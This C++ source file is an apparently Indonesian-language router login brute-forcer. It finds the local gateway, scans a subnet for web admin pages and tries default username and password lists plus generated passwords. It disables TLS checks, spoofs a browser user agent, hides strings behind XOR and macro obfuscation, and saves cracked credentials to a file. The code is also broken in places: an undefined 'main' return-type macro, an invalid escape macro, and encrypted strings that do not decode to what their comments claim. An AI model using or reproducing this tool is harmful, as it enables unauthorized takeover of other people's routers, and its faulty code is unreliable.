#include <iostream>
#include <string>
#include <vector>
#include <thread>
#include <chrono>
#include <fstream>
#include <sstream>
#include <cstdlib>
#include <cstring>
#include <regex>
#include <curl/curl.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <netdb.h>
#include <ifaddrs.h>
#include <unistd.h>
#include <net/if.h>
#include <sys/ioctl.h>
#include <signal.h>

using namespace std;

// OBFUSCATION MACROS
#define _AA(x) #x
#define _BB(x,y) x##y
#define _CC '\x'
#define _DD std::
#define _EE auto
#define _FF struct
#define _GG public
#define _HH private
#define _II return
#define _JJ for
#define _KK if
#define _LL else
#define _MM while
#define _NN try
#define _OO catch
#define _PP true
#define _QQ false
#define _RR nullptr
#define _SS void
#define _TT int
#define _UU char
#define _VV long
#define _WW unsigned
#define _XX const
#define _YY static
#define _ZZ virtual

// XOR ENCRYPTED STRINGS
_WW _UU __a1[]={0x2a,0x2d,0x2a,0x38,0x20,0x3f,0x3a,0x3d,0x24,0x3a,0x2f,0x2a,0x20};
_WW _UU __a2[]={0x2d,0x2a,0x3d,0x3d,0x38,0x3f,0x3e,0x20,0x2c,0x38,0x20,0x2a,0x2d,0x2d,0x38,0x3f,0x3e};
_WW _UU __a3[]={0x2c,0x38,0x20,0x2a,0x3f,0x3e,0x2a,0x3d};
_WW _UU __a4[]={0x38,0x2d,0x2a,0x3c,0x3e,0x20,0x2a,0x2a,0x2a,0x2a};
_WW _UU __a5[]={0x3d,0x38,0x20,0x2a,0x2d,0x2d,0x38,0x3f,0x3e,0x20,0x38,0x2d,0x2a,0x3c,0x3e};

// COMPLEX MACROS
#define _DEC(x) _decrypt(x,sizeof(x))
#define _HTTP(x,y,z) _http_request(x,y,z)
#define _SLEEP(x) this_thread::sleep_for(chrono::milliseconds(x))
#define _RANDOM(x) (rand()%x)
#define _CONCAT(a,b) a##b
#define _STRINGIFY(x) #x
#define _FORCEINLINE __attribute__((always_inline))
#define _INLINE inline

// OBFUSCATED CLASS
class _X1Y2Z3 {
_HH:
    _DD string _p1;
    _DD string _p2;
    _DD vector<_DD string> _w1;
    _DD vector<_DD string> _w2;
    _TT _c1;
    _DD string _s1;
    _DD string _s2;
    _DD string _s3;
    _DD string _s4;
    CURL* _ch;
    
    _DD string _decrypt(_WW _UU* data, _TT len) {
        _DD string res;
        _JJ(_TT i=0;i<len;i++) {
            res += data[i] ^ 0x55;
        }
        _II res;
    }
    
    _YY size_t _write_cb(_SS* ptr, size_t size, size_t nmemb, _DD string* data) {
        data->append((_UU*)ptr, size * nmemb);
        _II size * nmemb;
    }
    
    _DD string _http_request(_DD string url, _DD string postdata, _DD string& response_headers) {
        _ch = curl_easy_init();
        _DD string response_data;
        
        _KK(_ch) {
            curl_easy_setopt(_ch, CURLOPT_URL, url.c_str());
            _KK(!postdata.empty()) {
                curl_easy_setopt(_ch, CURLOPT_POSTFIELDS, postdata.c_str());
            }
            curl_easy_setopt(_ch, CURLOPT_WRITEFUNCTION, _write_cb);
            curl_easy_setopt(_ch, CURLOPT_WRITEDATA, &response_data);
            curl_easy_setopt(_ch, CURLOPT_TIMEOUT, 10L);
            curl_easy_setopt(_ch, CURLOPT_SSL_VERIFYPEER, 0L);
            curl_easy_setopt(_ch, CURLOPT_SSL_VERIFYHOST, 0L);
            curl_easy_setopt(_ch, CURLOPT_FOLLOWLOCATION, 1L);
            curl_easy_setopt(_ch, CURLOPT_MAXREDIRS, 5L);
            curl_easy_setopt(_ch, CURLOPT_USERAGENT, "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36");
            
            _DD vector<_DD string> headers;
            headers.push_back("Content-Type: application/x-www-form-urlencoded");
            headers.push_back("Accept: text/html,application/xhtml+xml,application/xml");
            headers.push_back("Accept-Language: en-US,en;q=0.9");
            headers.push_back("Connection: keep-alive");
            
            _DD _FF curl_slist* header_list = _RR;
            _JJ(_EE& h : headers) {
                header_list = curl_slist_append(header_list, h.c_str());
            }
            curl_easy_setopt(_ch, CURLOPT_HTTPHEADER, header_list);
            
            curl_easy_perform(_ch);
            curl_slist_free_all(header_list);
            curl_easy_cleanup(_ch);
        }
        _II response_data;
    }
    
    _DD string _find_url(_DD string ip) {
        _DD string protocols[] = {"http://", "https://"};
        _DD string ports[] = {"", ":8080", ":8443", ":80", ":443"};
        
        _JJ(_TT i=0;i<2;i++) {
            _JJ(_TT j=0;j<5;j++) {
                _DD string url = protocols[i] + ip + ports[j];
                _DD string headers;
                _DD string resp = _http_request(url, "", headers);
                
                _KK(resp.length() > 0) {
                    _p2 = url;
                    _II url;
                }
                _SLEEP(100);
            }
        }
        _II "";
    }
    
    _SS _init() {
        _c1 = 0;
        
        // Usernames
        _w1 = {
            "admin","root","user","Administrator","administrator",
            "support","tech","cisco","admin1","admin2","guest",
            "Admin","ADMIN","Root","ROOT","manager","network",
            "apc","webadmin","sysadmin","admin123","admin@123"
        };
        
        // Passwords
        _w2 = {
            "","admin","password","1234","12345","123456",
            "12345678","123456789","password123","admin123",
            "root123","default","letmein","cisco","cisco123",
            "adminadmin","12341234","43214321","11111111",
            "88888888","00000000","123123123","qwerty123",
            "abc123","pass123","admin@123","Admin@123"
        };
        
        _s1 = _DEC(__a1); // "admin"
        _s2 = _DEC(__a2); // "password123"
        _s3 = _DEC(__a3); // "login"
        _s4 = _DEC(__a4); // "dashboard"
        _p1 = _DEC(__a5); // "192.168.1.1"
    }
    
_GG:
    _X1Y2Z3() { _init(); curl_global_init(CURL_GLOBAL_ALL); }
    ~_X1Y2Z3() { curl_global_cleanup(); }
    
    _DD string _get_gateway() {
        _DD string gateway = "192.168.1.1";
        _FF ifaddrs *ifaddr, *ifa;
        
        _KK(getifaddrs(&ifaddr) == -1) {
            _II gateway;
        }
        
        _JJ(ifa = ifaddr; ifa != _RR; ifa = ifa->ifa_next) {
            _KK(ifa->ifa_addr == _RR) continue;
            _KK(ifa->ifa_addr->sa_family == AF_INET) {
                _FF sockaddr_in *sa = (_FF sockaddr_in*)ifa->ifa_addr;
                _FF sockaddr_in *mask = (_FF sockaddr_in*)ifa->ifa_netmask;
                
                _WW _VV ip = ntohl(sa->sin_addr.s_addr);
                _WW _VV netmask = ntohl(mask->sin_addr.s_addr);
                _WW _VV network = ip & netmask;
                _WW _VV gateway_ip = network | 0x00000001;
                
                _FF in_addr gw_addr;
                gw_addr.s_addr = htonl(gateway_ip);
                gateway = inet_ntoa(gw_addr);
                
                _KK(ifa->ifa_flags & IFF_LOOPBACK) continue;
                _KK((ifa->ifa_flags & IFF_UP) == 0) continue;
                
                _KK(gateway.find("192.168") == 0 || 
                    gateway.find("10.") == 0 || 
                    gateway.find("172.") == 0) {
                    freeifaddrs(ifaddr);
                    _II gateway;
                }
            }
        }
        
        freeifaddrs(ifaddr);
        _II gateway;
    }
    
    _TT _try_login(_DD string url, _DD string user, _DD string pass) {
        _DD string post_data;
        post_data = "username=" + user + "&password=" + pass;
        post_data += "&user=" + user + "&pass=" + pass;
        post_data += "&login=" + user + "&pwd=" + pass;
        post_data += "&admin=" + user + "&password=" + pass;
        
        _DD string headers;
        _DD string resp = _http_request(url, post_data, headers);
        
        _KK(resp.find(_s4) != string::npos || 
           resp.find("status") != string::npos ||
           resp.find("welcome") != string::npos ||
           resp.find("overview") != string::npos ||
           resp.find("logout") != string::npos ||
           resp.find("dashboard") != string::npos) {
            
            _KK(resp.find("invalid") == string::npos &&
               resp.find("failed") == string::npos &&
               resp.find("error") == string::npos) {
                _II 1;
            }
        }
        
        _II 0;
    }
    
    _TT _bruteforce(_DD string ip) {
        system("clear");
        cout << "\033[1;36m"; // Cyan
        cout << "╔════════════════════════════════════════════════╗\n";
        cout << "║    ROUTER ACCESS TOOL - LINUX EDITION v3.0    ║\n";
        cout << "║         G U N A K A N   S E N D I R I         ║\n";
        cout << "╚════════════════════════════════════════════════╝\n";
        cout << "\033[0m";
        
        cout << "\n[\033[1;32m+\033[0m] TARGET: " << ip << endl;
        
        _DD string url = _find_url(ip);
        _KK(url.empty()) {
            cout << "[\033[1;31m-\033[0m] TIDAK DAPAT TERHUBUNG!\n";
            _II 0;
        }
        
        cout << "[\033[1;32m+\033[0m] URL: " << url << endl;
        cout << "[\033[1;32m+\033[0m] USERNAMES: " << _w1.size() << endl;
        cout << "[\033[1;32m+\033[0m] PASSWORDS: " << _w2.size() << endl;
        cout << "[\033[1;32m+\033[0m] TOTAL: " << _w1.size() * _w2.size() << endl << endl;
        
        _TT total = 0;
        _TT found = 0;
        
        _JJ(_EE& user : _w1) {
            _KK(found) break;
            _JJ(_EE& pass : _w2) {
                total++;
                
                _KK(total % 50 == 0) {
                    cout << "\r[\033[1;33m*\033[0m] PERCOBAAN: " << total << "   " << flush;
                }
                
                _KK(_try_login(url, user, pass)) {
                    cout << "\n\n\033[1;32m";
                    cout << "╔════════════════════════════════════╗\n";
                    cout << "║         L O G I N   O K           ║\n";
                    cout << "╚════════════════════════════════════╝\n";
                    cout << "\033[0m";
                    cout << "[\033[1;32m+\033[0m] USERNAME: " << user << endl;
                    cout << "[\033[1;32m+\033[0m] PASSWORD: " << pass << endl;
                    cout << "[\033[1;32m+\033[0m] URL: " << url << endl;
                    
                    ofstream file("result.txt", ios::app);
                    file << "[" << __TIME__ << "] " << ip << " | " << user << ":" << pass << " @ " << url << endl;
                    file.close();
                    
                    found = 1;
                    break;
                }
                
                _SLEEP(30); // Delay antar percobaan
            }
        }
        
        _KK(!found) {
            cout << "\n\n[\033[1;31m-\033[0m] GAGAL! (" << total << " PERCOBAAN)\n";
        }
        
        _II found;
    }
    
    _TT _scan_network() {
        _DD string base_ip = "192.168.1.";
        cout << "\n[\033[1;33m*\033[0m] SCAN JARINGAN...\n";
        
        _JJ(_TT i=1;i<255;i+=10) { // Scan 10 IP sekaligus
            _DD string ip = base_ip + to_string(i);
            cout << "    MENCoba " << ip << "... " << flush;
            
            _DD string url = _find_url(ip);
            _KK(!url.empty()) {
                cout << "\033[1;32mBERHASIL\033[0m\n";
                _bruteforce(ip);
                _II 1;
            } _LL {
                cout << "\033[1;31mGAGAL\033[0m\n";
            }
        }
        _II 0;
    }
    
    _TT _menu() {
        _MM(_PP) {
            system("clear");
            cout << "\033[1;36m";
            cout << "┌─────────────────────────────────────┐\n";
            cout << "│           M E N U   U T A M A       │\n";
            cout << "├─────────────────────────────────────┤\n";
            cout << "│ 1. DETEKSI GATEWAY & LOGIN          │\n";
            cout << "│ 2. INPUT IP MANUAL                  │\n";
            cout << "│ 3. SCAN JARINGAN (192.168.1.x)      │\n";
            cout << "│ 4. BRUTE FORCE CEPAT                │\n";
            cout << "│ 5. BRUTE FORCE LENGKAP              │\n";
            cout << "│ 6. LIHAT WORDLIST                    │\n";
            cout << "│ 0. KELUAR                            │\n";
            cout << "└─────────────────────────────────────┘\n";
            cout << "\033[0m";
            
            cout << "\nPILIH: ";
            _DD string pilih;
            getline(cin, pilih);
            
            _KK(pilih == "1") {
                _DD string gw = _get_gateway();
                cout << "\n[\033[1;32m+\033[0m] GATEWAY: " << gw << endl;
                _bruteforce(gw);
            }
            _LL _KK(pilih == "2") {
                cout << "IP ROUTER: ";
                _DD string ip;
                getline(cin, ip);
                _bruteforce(ip);
            }
            _LL _KK(pilih == "3") {
                _scan_network();
            }
            _LL _KK(pilih == "4") {
                cout << "IP ROUTER: ";
                _DD string ip;
                getline(cin, ip);
                
                // Username terbatas
                _w1 = {"admin", "root", "user"};
                // Password terbatas
                _w2 = {"", "admin", "1234", "password", "12345"};
                
                _bruteforce(ip);
            }
            _LL _KK(pilih == "5") {
                cout << "IP ROUTER: ";
                _DD string ip;
                getline(cin, ip);
                
                // Generate password dinamis
                _w2.clear();
                _JJ(_UU a='a'; a<='z'; a++) {
                    _JJ(_UU b='a'; b<='z'; b++) {
                        _JJ(_UU c='0'; c<='9'; c++) {
                            _DD string pwd = _DD string(1,a) + _DD string(1,b) + _DD string(1,c);
                            _w2.push_back(pwd);
                        }
                    }
                }
                
                _bruteforce(ip);
            }
            _LL _KK(pilih == "6") {
                cout << "\n[\033[1;33m*\033[0m] USERNAMES (" << _w1.size() << "):\n";
                _JJ(_TT i=0; i<10 && i<_w1.size(); i++) {
                    cout << "    - " << _w1[i] << endl;
                }
                cout << "\n[\033[1;33m*\033[0m] PASSWORDS (" << _w2.size() << "):\n";
                _JJ(_TT i=0; i<10 && i<_w2.size(); i++) {
                    cout << "    - " << _w2[i] << endl;
                }
            }
            _LL _KK(pilih == "0") {
                cout << "\n[\033[1;32m+\033[0m] TERIMA KASIH!\n";
                _II 0;
            }
            
            cout << "\n\nTEKAN ENTER UNTUK LANJUT...";
            cin.get();
        }
        _II 0;
    }
};

// Signal handler untuk clean exit
void _sigint_handler(int) {
    cout << "\n\n[\033[1;33m!\033[0m] INTERRUPTED\n";
    exit(0);
}

_T main() {
    signal(SIGINT, _sigint_handler);
    
    _X1Y2Z3 obj;
    _II obj._menu();
}
